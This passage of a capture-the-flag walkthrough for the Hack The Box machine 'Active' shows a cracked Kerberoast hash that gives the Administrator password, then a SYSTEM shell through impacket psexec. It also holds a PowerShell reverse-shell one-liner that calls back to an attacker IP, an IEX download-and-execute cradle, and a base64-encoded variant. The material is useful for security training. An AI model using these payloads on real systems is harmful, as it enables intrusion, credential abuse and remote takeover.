>   Autodetect.Enabled..: Yes
>   Self.Test.Enabled...: Yes
>   Potfile.Enabled.....: Yes
>   Custom.Plugin.......: No
>   Plaintext.Encoding..: ASCII, HEX
>
> Hash mode #13200
>   Name................: AxCrypt 1
>   Category............: Archive
>   Slow.Hash...........: Yes
>   Password.Len.Min....: 0
>   Password.Len.Max....: 256
>   Salt.Type...........: Embedded
> ```
>

***Hash Mode → 13100***

Once the Hash mode is detected, simply proceed as follows →

```bash title="Active/evidence/data"
hashcat --hash-type 13100 --attack-mode 0 --force -O --outfile hash.cracked hash.kerberoast /usr/share/wordlists/rockyou.txt
```

> [!DANGER]- *hash.cracked*
>
> ```bash
> $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$fb38a29d066b71c0f8f4c8b3b80e5396$75923575491ad7dd293ddeae6eb18a48796f3cf2f35747e1c8c594c9195ba1a15841e0c2e45f0ac7fc53d0d7b3120ee25ee75d56848b6a803c5fae156839e80e60ad9294418f10f12e9d9aff4a1dfa0c7de31ca0805c6e15d8c560bf968606b6c92feb529aff3f8022253d7290889ac0c1a408779f382733d7a751cd241bad3528b766d9ff3d3183a39da8e675c6059380ffc37619569bfee29b2e88ea490062f700a49e584dfe4d67624590259bad59364037f50b90773cf8b08998655ef3e9a854ed5cd38c88850f04577d7da3091220247c7464f0cf32109a34c97153441e28e29f7ff392cc5a24cc35f0620520ea908ceb27bca680eff8701f052717f302029df8959dc9e4b54f913b457e33174c308f33f4bd6db7f8b081c54cd4c73af655e7e4874ccd27e8a450c4eacf112ee981ea0f578b1e4912af97ac80cb99c544dbd729859a645bd4367ea67f6be6bd1a92295807545c8fd706b9d95ba2b9325df3b762bb5bd2d0c7bb76e300a89fd5d22ffefdb1458be615ae63252684f529042b99573dcc85b4fa11eca991e968a732f1f8a39cd0bf12dc23a5238eedad59894d5121ecb8c9c8234e9033fa787ff8e4802f2eb75079edae0fe259a8fca0e0e9695293577247ffc5de67bb9231fdfbad945a8bec66f7c6db3c82638adec47f1305d55648df16cb9e4178824c4767af03c043d45b8a22a35c1d1bb3eb5d1c5766169a6908affcbd0c8cd5fc2e721cc52672b3309d238255f8936827702ee94d71dccd902b63cfab85f960880bfd32ac330e619bc6810f2e7d1ed54c7ba08f45976f96738260f84c3949085483da2cb5a26002278146b9c91399324c76f923005255f634ce3c4d169f6fc87219da0e1bb8b23236188546fe0ed8deb71b2fe0dd68222af3c12c24fcaa4b6e4345bd70dab0e0ef1a361db94e1ba3e3f86030d648aa7e6b1c0273511bd325b77cba344bc5ba2e41050f199d7aa4c962fc9dfeab3c396aaba035323a52d5bd23dffa5f49ca487594a4de3f583a525d702bfc89b7e9657f9d808607969d2039f894f72bfe461774f53ff9435e347d8948450c1b140f8945a6dbcd589e6ca348974d7ea8998a28baba4249a5ddfd32d11be21ca21a6d7a1f95ddcc33fec1f80498fe7d24e5b7adda10613df39666ed7677ecdf0fc28bf39cf43571ba892e47f526e72a876f40780d40b537c79cacbe881f572ade28a690a8f6483050780489d740a69bbe06dd7cda2e7bbbfaaa73ba66ae:Ticketmaster1968
> ```
>

***Password → Ticketmaster1968***

***And Boom!*** We now have the *Administrator's Password*

---
#### Shell as Administrator

##### PSExec

As mentioned earlier, the *WINRM* ports are not open, so we cannot stablish a connection through `evil-winrm` to get a shell

Although, since we have the *Administrator User's Credentials*, we can use `psexec` from ***[impacket](https://github.com/fortra/impacket)*** to execute *system commands*  in the *target* or get a shell via `cmd.exe`

Shell access is also possible from a `powershell.exe`. The terminal hangs up and get stuck when running a powershell from the cmd

But we can just establish a reverse connection through a *Reverse Shell* using `psexec` too

Let's look at both ways to accomplish the same task, which is to gain remote access to the machine as the *Administrator User*

###### *CMD*

Simply proceed as follows →

```bash title="Active/tools"
psexec.py -dc-ip 10.129.135.22 active.htb/Administrator:Ticketmaster1968@active.htb
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/tools"
> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
>
> [*] Requesting shares on active.htb.....
> [*] Found writable share ADMIN$
> [*] Uploading file MFfZgtve.exe
> [*] Opening SVCManager on active.htb.....
> [*] Creating service nNMb on active.htb.....
> [*] Starting service nNMb.....
> [!] Press help for extra shell commands
> Microsoft Windows [Version 6.1.7601]
> Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
>
> C:\Windows\system32> whoami
> nt authority\system
> C:\Windows\system32>
> ```
>

***And Boom!*** We are in as *Administrators*

###### *Powershell*

First, you need a *reverse shell* payload in powershell to establish a reverse connection from the *target* to the attacker

The idea is to use `psexec` to run a `powershell.exe` instance that will use `Invoke-Expression`, aka `IEX`, to execute as a command the *HTTP Response's Body*, which is the *reverse shell* payload that the attacker is sharing with a *Simple HTTP Web Server*

Thus, let's we will use the ***[Nishang Reverse TCP Oneliner](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1)*** as the payload

```bash title="Active/tools"
curl --silent --request GET --location --output reverse.ps1 "https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
```

We have to modify it setting up our *Listener Socket*

```bash title="Active/tools"
nvim ./reverse.ps1
```

> [!BUG]- *reverse.ps1*
>
> ```bash
> $client = New-Object System.Net.Sockets.TCPClient('10.10.16.34',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
> ```
>

Once the above is done, set up a *Simple HTTP Server* with `python3` to share the `reverse.ps1`

```bash title="Active/tools"
python3 -m http.server 8888
```

Before executing the command from the target to request the *reverse shell*, remember to set up the *Listening Socket* specified in the payload, e.g. using `netcat`

```bash
rlwrap nc -nlvp 443
```

Then, request the shared resource from the *target*

```bash
psexec.py -dc-ip 10.129.135.22 active.htb/Administrator:Ticketmaster1968@active.htb "powershell.exe -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.34:8888/reverse.ps1')"
```

> [!NOTE]- *Netcat Output*
>
> ```bash
> rlwrap nc -nlvp 443
> listening on [any] 443 ...
> connect to [10.10.16.34] from (UNKNOWN) [10.129.135.22] 50143
> 
> PS C:\Windows\system32> whoami
> nt authority\system
> ```
>

***And Boom!*** We are in as *Administrators*

> [!CAUTION]-
>
> If something goes wrong and the reverse connection cannot be stablished, just change the above powershell command's scheme codification to `UTF-16LE` and *Base64 encode* it
>
> ```bash
> echo -n "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.34:8888/reverse.ps1')" | iconv --to-code UTF-16LE | base64 -w 0 ; echo
> ```
>
> Then pass that *Base64 String* as argument to the `powershell.exe` instance executed by `psexec`
>
> ```bash
> psexec.py -dc-ip 10.129.135.22 active.htb/Administrator:Ticketmaster1968@active.htb 'powershell.exe -Exec Bypass -Enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwA0ADoAOAA4ADgAOAAvAHIAZQB2AGUAcgBzAGUALgBwAHMAMQAnACkA"'
> ```
>